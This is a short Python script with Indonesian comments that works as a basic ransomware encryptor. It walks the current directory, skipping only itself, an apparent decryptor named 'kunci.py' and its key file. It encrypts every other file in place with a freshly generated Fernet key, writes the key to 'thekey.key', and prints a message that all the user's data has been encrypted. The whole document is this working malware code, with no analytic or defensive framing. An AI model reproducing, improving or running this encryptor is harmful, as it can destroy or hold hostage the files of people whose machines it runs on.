#program untuk enskrpsi file
import os
from cryptography.fernet import Fernet

#membaca semua file yang ada direktori
files = []
for file in os.listdir():
  if file == 'gembok.py' or file == "thekey.key" or file == "kunci.py": #untuk hide file penting
          continue
  if os.path.isfile(file): #membaca file dalam folder di direktori yang di tuju
        files.append(file)

#menampilkan hasil baca file
print(files)

#membuat kunci untuk enskripsi file denagn fernet
key = Fernet.generate_key()
with open("thekey.key","wb") as thekey:
      thekey.write(key)

#perintah untuk enkripsi semua file yang ada di direktori 
for file in files:
    with open(file, "rb") as thefile:
            contents = thefile.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file,"wb") as thefile:
            thefile.write(contents_encrypted)


print("semua datamu sudah terenskripsi")
